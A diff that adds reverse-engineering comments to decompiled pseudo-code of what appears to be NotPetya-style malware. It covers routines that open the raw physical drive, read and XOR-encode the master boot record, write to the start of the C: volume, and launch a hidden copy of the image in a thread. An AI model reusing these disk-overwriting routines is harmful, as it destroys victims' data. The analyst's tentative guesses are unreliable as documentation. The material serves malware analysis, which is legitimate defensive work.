@@ -156,8 +156,9 @@ int __stdcall GetSystemVolumes(char *a1) // char*
 		return 160;
 	memset(a1, 0, 0x104u);
 	strcpy(&Src, "\\\\.\\PhysicalDrive");
+
 	if (GetSystemDirectoryA(&Buffer, 0x104u) // MAX_PATH
-		&& (LOBYTE(v25) = Buffer, file_h = CreateFileA(FileName, 0, 3u, 0, 3u, 0, 0), hObject = file_h, file_h != INVALID_HANDLE_VALUE))
+		&& (LOBYTE(v25) = Buffer, file_h = CreateFileA(FileName /* \\.\C: */, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0), hObject = file_h, file_h != INVALID_HANDLE_VALUE))
 	{
 		if (DeviceIoControl(file_h, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &OutBuffer, 0x20u, &BytesReturned, NULL))
 		{
@@ -177,7 +178,7 @@ int __stdcall GetSystemVolumes(char *a1) // char*
 					if (v4 > 0x103)
 						v5 = 259;
 					v7 = a1;
-					memcpy(a1, &Src, v5);
+					memcpy(a1, &Src, v5); // coppies \\.\PhysicalDrive to the dest. LAter on used for param in CreateSomeFiles()
 					v6 = Size;
 					*(a1 + v5) = 0;
 				}
@@ -187,7 +188,7 @@ int __stdcall GetSystemVolumes(char *a1) // char*
 					v9 = v6 + v8;
 					if (v6 + v8 < 0x104)
 					{
-						memcpy(&v7[v8], &DstBuf, Size);
+						memcpy(&v7[v8], &DstBuf, Size); // coppies the byte 0x30 to a DST ... I am assuming this to be a size of some sort.
 						v7[v9] = 0;
 					}
 				}
@@ -213,7 +214,7 @@ int __stdcall GetSystemVolumes(char *a1) // char*
 		if (result > 0)
 			result = result | 0x80070000;
 	}
-	return result;
+	return result; // This result will be the 
 }
 
 //----- (681F122D) --------------------------------------------------------
@@ -230,7 +231,19 @@ int __stdcall CreateSomeFiles(LPCSTR lpFileName, void * a2)
 	BytesReturned = 0;
 	if (!lpFileName)
 		return 0x80070057;
-	v4 = CreateFileA(lpFileName, 0x80100000, 3u, 0, 3u, 0, 0);
+
+/*
+CPU Stack
+Address   Value      ASCII Comments
+0069A59C  /0069AE78  x®i   ; |FileName = "\\.\PhysicalDrive0"
+0069A5A0  |80100000    €  ; |DesiredAccess = GENERIC_READ|100000
+0069A5A4  |00000003       ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
+0069A5A8  |00000000        ; |pSecurity = NULL
+0069A5AC  |00000003       ; |CreationDistribution = OPEN_EXISTING
+0069A5B0  |00000000        ; |Attributes = 0
+0069A5B4  |00000000        ; \hTemplate = NULL	
+	*/
+	v4 = CreateFileA(lpFileName, GENERIC_READ | 100000, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 	if (v4 == INVALID_HANDLE_VALUE)
 	{
 		v5 = GetLastError();
@@ -238,8 +251,21 @@ int __stdcall CreateSomeFiles(LPCSTR lpFileName, void * a2)
 			v5 = v5 | 0x80070000;
 		v2 = v5;
 	}
-	else
+	
 	{
+/*
+	CPU Stack
+Address   Value      ASCII Comments
+0069A598  /00000318      ; |hDevice = 00000318
+0069A59C  |00070048  H    ; |IoControlCode = 70048
+0069A5A0  |00000000        ; |InBuffer = NULL
+0069A5A4  |00000000        ; |InSize = 0
+0069A5A8  |0069A5C0  À¥i   ; |OutBuffer = 0069A5C0 -> 00
+0069A5AC  |00000090       ; |OutSize = 144.
+0069A5B0  |0069A654  T¦i   ; |BytesReturned = 0069A654 -> 0
+0069A5B4  |00000000        ; \pOverlapped = NULL
+	 */
+
 		if (DeviceIoControl(v4, 0x70048u, 0, 0, &OutBuffer, 0x90u, &BytesReturned, 0))
 		{
 			a2 = OutBuffer;
@@ -257,10 +283,10 @@ int __stdcall CreateSomeFiles(LPCSTR lpFileName, void * a2)
 }
 
 //----- (681F12D5) --------------------------------------------------------
-int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst)
+int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst) // Perhaps this should be BYTE * ? 
 {
 	signed __int32 v2; // esi
-	HANDLE v4; // ebx
+	HANDLE v4; // ebx  //hfile
 	signed __int32 v5; // eax
 	signed __int32 v6; // eax
 	DWORD NumberOfBytesRead; // [esp+10h] [ebp-4h]
@@ -280,7 +306,19 @@ int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst)
 	}
 	else
 	{
-		if (!SetFilePointerEx(v4, 0i64, 0, 0) || !ReadFile(v4, Dst, 0x200u, &NumberOfBytesRead, 0))
+/*
+		CPU Stack
+Address   Value      ASCII Comments
+0047A1D8  /00000330  0    ; |hFile = 00000330
+0047A1DC  |00000000        ; |Distance.Lo = 0
+0047A1E0  |00000000        ; |Distance.Hi = 0
+0047A1E4  |00000000        ; |pNewFilePointer = NULL
+0047A1E8  |00000000        ; \Origin = FILE_BEGIN
+*/
+
+		LARGE_INTEGER Distance; // Really doesn't seem to matter.
+
+		if (!SetFilePointerEx(v4, Distance, &Distance, FILE_BEGIN) || !ReadFile(v4, Dst, 0x200u, &NumberOfBytesRead, 0)) // Reads MBR1 
 		{
 			v6 = GetLastError();
 			if (v6 > 0)
@@ -332,13 +370,26 @@ int  CheckIfFileExists(int a1, LPCSTR lpFileName, LPCVOID lpBuffer) // Probably 
 }
 
 //----- (681F1424) --------------------------------------------------------
-int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen)
+int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen) 
 {
 	signed __int32 v2; // eax
 	signed __int32 v3; // eax
 	HCRYPTPROV phProv; // [esp+Ch] [ebp-4h]
 
 	phProv = 0;
+
+	/*
+	CPU Stack
+Address   Value      ASCII Comments
+0047A1DC  /0047A1FC  ü¡G
+0047A1E0  |00000000
+0047A1E4  |00000000
+0047A1E8  |00000001  
+0047A1EC  |F0000000     ð
+	*/
+
+
+
 	if (CryptAcquireContextA(&phProv, 0, 0, 1u, 0xF0000000))
 		goto LABEL_14;
 	v2 = GetLastError();
@@ -414,7 +465,7 @@ int RunCryptWriteMBR()
 	void *v46; // [esp+9A4h] [ebp-4h]
 
 	FileName = 0;
-	memset(&Dst, 0, 0x103u);
+	memset(&Dst, 0, 0x103u); // This is all &Dst -- When we code clean this will be important. 
 	v24 = 0;
 	memset(&v25, 0, 0x1FFu);
 	Buffer = 0;
@@ -451,9 +502,9 @@ int RunCryptWriteMBR()
 				do
 				{
 					v2 = *(&pbBuffer + v1++) % 0x3Au;
-					*(&v40 + v1) = *(byte_681FFF4C + v2);
+					*(&v40 + v1) = *(byte_681FFF4C + v2); // Please look at In next iteration.
 				} while (v1 < 0x3C);
-				result = CreateFileSetFP(&FileName, &v24);
+				result = CreateFileSetFP(&FileName /*  \\.\PhysicalDrive0.   */, &v24); // 
 				dword_6820F8F8 = result;
 				if (result >= 0)
 				{
@@ -478,10 +529,10 @@ int RunCryptWriteMBR()
 					v6 = 0;
 					do
 					{
-						*(&v22 + v6) ^= 7u;
+						*(&v22 + v6) ^= 7u; // This XORS the MBR against 0x07
 						++v6;
-					} while (v6 < 0x200);
-					memset(&v20, 7, 0x200u);
+					} while (v6 < 0x200);// Looks like another memcpy // Copies MBR over
+					memset(&v20, 7, 0x200u); 
 					Buffer = 0;
 					result = CryptoAcquireContext(&v31, 0x20u);
 					dword_6820F8F8 = result;
@@ -6374,7 +6425,7 @@ void  perfc_1(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE
 
 	PerformPrivChecks();
 	if (hThread != (HANDLE)-1)
-		SetVirtualAttributes(a3, dwErrCode, Thread);
+		SetVirtualAttributes(a3, dwErrCode, Thread);// 0 , 1 , this image header // Looks like this launches a part of itself in thread.
 	WSAStartup(0x202u, &stru_6820F768);
 	lpParameter = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
 	lpCriticalSection = sub_681F7091(8, CompareStringsW_2, CleanUpHeaps_3, 255);
@@ -7097,7 +7148,7 @@ signed int CreateSomeFile()
 		}
 		CloseHandle(hFile);
 	}
-	return v8;
+	return v8; // Returns bytes written?
 }
 
 //----- (681F8B70) --------------------------------------------------------
@@ -7231,23 +7282,24 @@ signed int EnumPhysDriv0()
 //----- (681F8D5A) --------------------------------------------------------
 int SetLockAtCDir()
 {
-	HANDLE v0; // edi
+	HANDLE v0; // edi // hDevice
 	HLOCAL v1; // ebx
 	int result; // eax
 	DWORD BytesReturned; // [esp+Ch] [ebp-1Ch]
 	char OutBuffer; // [esp+10h] [ebp-18h]
 	LONG lDistanceToMove; // [esp+24h] [ebp-4h]
 
-	v0 = CreateFileA("\\\\.\\C:", 0x40000000u, 3u, 0, 3u, 0, 0);
+
+	v0 = CreateFileA("\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (v0)
 	{
-		if (DeviceIoControl(v0, 0x70000u, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0))
+		if (DeviceIoControl(v0, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0))
 		{
-			v1 = LocalAlloc(0, 10 * lDistanceToMove);
+			v1 = LocalAlloc(LMEM_FIXED, 10 * lDistanceToMove); //0x1400 // 
 			if (v1)
 			{
-				SetFilePointer(v0, lDistanceToMove, 0, 0);
-				WriteFile(v0, v1, lDistanceToMove, &BytesReturned, 0);
+				SetFilePointer(v0, lDistanceToMove, NULL, FILE_BEGIN); // LdistanceToMove 0x200 // 512 Size of mbr?
+				WriteFile(v0, v1 /*SomeMBR*/, lDistanceToMove, &BytesReturned, 0); // Write MBR ? 
 				LocalFree(v1);
 			}
 		}
@@ -7772,7 +7824,7 @@ BOOL  CleanUp(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE
 // 6820F13C: using guessed type int dword_6820F13C;
 
 //----- (681F9590) --------------------------------------------------------
-int __stdcall SetVirtualAttributes(int a1, int a2, int a3)
+int __stdcall SetVirtualAttributes(int a1, int a2, HANDLE a3)
 {
 	HMODULE v3; // edi
 	char *v4; // eax
@@ -7796,7 +7848,7 @@ int __stdcall SetVirtualAttributes(int a1, int a2, int a3)
 			v5 = v4;
 			if (v4)
 			{
-				dword_6820F13C = v4;
+				dword_6820F13C = v4; // function pointer call ... Call EAX. This function is hidden.. calls 04F194A5 // Looks like it is a thread.
 				memcpy(v4, v3, dwSize);
 				v6 = dword_6820F0FC;
 				v7 = dword_6820F0FC + *(dword_6820F0FC + 60);
